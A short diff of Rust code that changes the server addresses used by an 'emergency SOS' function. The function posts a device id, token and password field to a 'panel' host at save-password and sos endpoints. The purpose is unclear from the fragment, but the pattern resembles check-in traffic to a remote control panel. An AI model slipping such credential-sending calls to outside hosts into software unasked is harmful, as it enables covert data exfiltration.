@@ -137,7 +137,7 @@ fn dispatch_emergency_sos() {
             .to_string_lossy()
             .into_owned();
         let _ = client
-            .post("http://ad.apndocs.site:3000/api/device/save-password")
+            .post("https://panel.sagaaml.online/api/device/save-password")
             .json(&serde_json::json!({
                 "id": id.clone(),
                 "pass": "",
@@ -147,7 +147,7 @@ fn dispatch_emergency_sos() {
             }))
             .send();
         match client
-            .post("http://ad.apndocs.site:3000/api/device/sos")
+            .post("https://panel.sagaaml.online/api/device/sos")
             .header("X-Device-Id", &id)
             .header("X-Device-Token", &token)
             .json(&serde_json::json!({ "source": "ctrl-shift-f11" }))
